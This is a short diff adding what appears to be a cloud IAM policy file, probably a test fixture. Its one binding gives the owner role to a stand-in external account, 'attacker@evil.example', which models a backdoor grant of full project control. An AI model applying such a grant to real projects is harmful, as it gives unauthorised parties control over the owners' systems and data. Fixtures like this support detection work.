@@ -1,0 +1,12 @@
+{
+  "bindings": [
+    {
+      "members": [
+        "user:attacker@evil.example"
+      ],
+      "role": "roles/owner"
+    }
+  ],
+  "etag": "BwYCa10OwnerExt=",
+  "version": 1
+}
